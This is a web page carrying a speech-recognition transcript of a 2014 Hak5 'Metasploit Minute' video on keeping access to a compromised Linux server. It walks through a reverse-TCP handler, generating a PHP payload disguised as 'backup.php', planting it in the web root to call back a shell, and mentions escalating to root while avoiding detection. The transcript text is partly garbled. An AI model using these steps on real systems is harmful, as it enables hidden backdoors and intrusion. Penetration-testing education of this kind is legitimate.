<!DOCTYPE html><html lang="en"><head><script async src="https://www.googletagmanager.com/gtag/js?id=UA-114897551-4"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'UA-114897551-4');
</script><script type="text/javascript" src="//platform-api.sharethis.com/js/sharethis.js#property=5ac2443d1fff98001395ab6c&amp;product=sticky-share-buttons" async="async"></script><title>Linux Persistance - Metasploit Minute | Coder Coacher - Coaching Coders</title><meta content="Linux Persistance - Metasploit Minute - All technical stuff in one place" name="description"><meta name="keywords" content="education, coding, programming, technology, nodejs, mongodb, software, computer science, engineering, teaching, coaching, coder, learning, java, kotlin, machine learning, AI, ML, tech talks, angular, javascript, js, typescript"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/bootstrap.css"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/coder-coacher.css"></head><body><div class="container-fluid"><h1 class="site-title"><a href="/">Coder Coacher</a></h1><hr><h4 class="site-subtitle text-right">Coaching Coders</h4></div><div id="amzn-assoc-ad-99d6751e-2392-4004-ad16-73aa8385d9d0"></div><script async src="//z-na.amazon-adsystem.com/widgets/onejs?MarketPlace=US&amp;adInstanceId=99d6751e-2392-4004-ad16-73aa8385d9d0"></script><div class="post__breadcrumb"><div class="container"><ol class="breadcrumb"><li><a href="/">Coder Coacher</a></li><li><a href="/Hak5/">Hak5</a></li><li class="active">â¤µ</li></ol></div></div><h2 class="post__title"><b>Linux Persistance - Metasploit Minute</b></h2><h5 class="post__date">2014-04-07</h5><div class="container"><div class="video-responsive"><iframe width="560" height="315" src="https://www.youtube.com/embed/bkfgPawWlQs" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe></div><div class="post__text">Linux persistence this time on
Metasploit minute this Metasploit minute
is brought to you by hack 5 and viewers
like you
support us directly at h a case shop
calm welcome to Metasploit minute the
breakdown on breaking in I'm your host
Rob fuller but you can call me Moving's
as you recall last time we exploited
Java RMI on the virtual corporations DMZ
today we'll be continuing the attack by
setting up persistence why is
persistence is important you may ask
well honestly I don't want to have to
work at getting back on a system alright
once it's mine I it's it's mine I don't
want to give it back so if someone
patches a way in or the Java RMI
turns off class loading then we're we're
off that system and I don't like that so
we're gonna show you how to setup
persistence on this specific linux host
and by doing that what why you want to
do or not how you want to do that is
simply by learning about that system how
it works and in ways that you can make
some tweaks or make them file changes
that isn't gonna cause a lot of
disruption because we want to go low and
slow we won't we don't want to get
detected and we want to have a way that
we can consistently get back in without
too much mustard fuss so how we're gonna
do that today is with PHP interpreter
now first what we're gonna have to do is
set up PHP interpreter well we can't do
that unless we actually have a multi
handler so again we talked about this
before multi handler is the end-all
be-all of handling any kind of payload
or call back or or way that Metasploit
has something talking to it we setup
exploit multi handler set pH set payload
to PHP interpreter reverse TCP now since
we know that the 1099 port worked we're
going to continue
to use that port as a callback so l port
set L port helps 1099 set L host to our
host and the great thing about any worse
TCP payload is when you hit double tab
it will automatically find the public IP
address or not the public that the
gateway based IP address of your local
system show options that's all set set
exit on session remember that's that's
the option that says if I get a session
don't close down the handler said X's on
session to false exploit - J that's all
it's doing that's it's just waiting
there on port 1099 to see a PHP
interpreter come back on reverse TCP
well we have to actually generate that
PHP code so use payload PHP interpreter
reverse TCP show options we've set our l
host again set our L port again $10.99
dinner generate - h lets us know our
options so - t our output is raw the
reason why we're not going to say like
PHP or something like that
in this is because PHP interpreter in
raw format is PHP so and that's
depending on the kind of payload that
are the yeah the kind of payload that
you are selecting if you're selecting a
Windows binary or Windows shell code
you're going to get raw binary at you so
I recommend not doing that and then F
for the file and we're just going to
call it
PHP mmm what's an inventive name how
about backup dot PHP so we wrote backup
that PHP go back into our sessions
sessions down one we're in slash we need
to change directory into the VAR ww
now again the some interpreter session
that we have right now is the Java
interpreter so we do an LS and we see
that there's there's some PHP code
already in there PHP info or PHP info
duck
HP so we know that PHP handling works in
that directory so then we upload our
backup dot PHP into that directory it's
there but we didn't get a shell why
didn't we get a shell because that file
is just sitting there
if anybody invokes it backup dot PHP by
going and surfing to that site it's
supposed to work so let's not do that
I'm actually not exactly sure why that
didn't work so what we're going to do is
we're going to go into Metasploit nano
backup dot PHP for some reason it's
commented out the PHP
so to close it off
that's odd okay let's try real uploading
it s unless delete or RM the backup dot
PHP actually let's see if we can edit on
on target backup PHP cool and since I'm
horrible at Vai we're gonna we gotta go
down do to do to do to do to do insert I
can see so many people cringing right
now because of this right quit now we
tada
now instead of showing this output we
actually have a connecting you can't
it's really hard to see but you can see
back here that we have a session with
PHP Twitter as WW data the fact that
we're WWE data means that we've lost
permissions because of this because
Apache is the one that's doing the
exploitation or the the callback the WW
data is what Apache is running as so
what we need to do is set up some way
for our our www data to get up to the
point where we are as root so we can do
a set UID we can binary our script we
can do a number of different methods to
add our self as pseudo or whatever next
week we'll be pivoting around the DMZ a
little bit more so stay tuned so what do
you think hit me up at MSF at hack 5 org
and stay tuned to Metasploit minute comm
for more shows like these and thank you
so much for supporting the show if you
want to support us even more go to h a
case shop comm enter coupon code mu mix
and get some free Metasploit minute
stickers until next time i'm muak sand
i'll be hacking til the cows come home</div></div><div class="container-fluid bottom-ad"><div id="amzn-assoc-ad-6a809dda-347a-4187-8a86-91faf94575da"></div><script async src="//z-na.amazon-adsystem.com/widgets/onejs?MarketPlace=US&amp;adInstanceId=6a809dda-347a-4187-8a86-91faf94575da"></script></div><div class="text-center">We are a participant in the Amazon Services LLC Associates Program, an affiliate advertising program designed to provide a means for us to earn fees by linking to Amazon.com and affiliated sites.</div><script>(function(w, d){
    var b = d.getElementsByTagName('body')[0];
    var s = d.createElement("script"); s.async = true;
    var v = !("IntersectionObserver" in w) ? "8.6.0" : "10.4.2";
    s.src = "https://cdnjs.cloudflare.com/ajax/libs/vanilla-lazyload/" + v + "/lazyload.min.js";
    w.lazyLoadOptions = {};
    b.appendChild(s);
}(window, document));</script></body></html>